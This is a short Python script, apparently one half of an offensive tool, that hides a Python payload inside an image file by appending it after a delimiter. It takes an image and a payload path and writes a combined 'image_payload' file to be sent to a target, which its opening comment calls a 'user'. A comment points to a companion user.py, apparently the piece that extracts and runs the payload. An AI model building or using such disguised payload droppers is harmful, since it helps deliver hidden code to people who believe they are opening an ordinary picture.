#send a pew pew payload to a user

import sys
import os

DELIMITER = b'********'  # must be the same in user.py

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'usage: py {sys.argv[0]} <image> <payload>')
        exit()

    img_path = sys.argv[1]
    payload_path = sys.argv[2]

    # check if image file exists
    if not all((os.path.exists(img_path), os.path.isfile(img_path))):
        print('error: image file not found.')
        exit(-1)

    # check if Python payload file exists
    if not all((os.path.exists(payload_path), os.path.isfile(payload_path), payload_path.endswith('.py'))):
        print('error: python payload file not found.')
        exit(-1)

    # read payload
    with open(payload_path, 'rb') as file:
        payload_data = file.read()

    # read image data
    with open(img_path, 'rb') as file:
        image_data = file.read()

    # embed payload to image
    ext = os.path.splitext(img_path)[1]

    with open('image_payload' + ext, 'wb') as file:
        file.write(image_data + DELIMITER + payload_data)

    print('success: payload embedded!')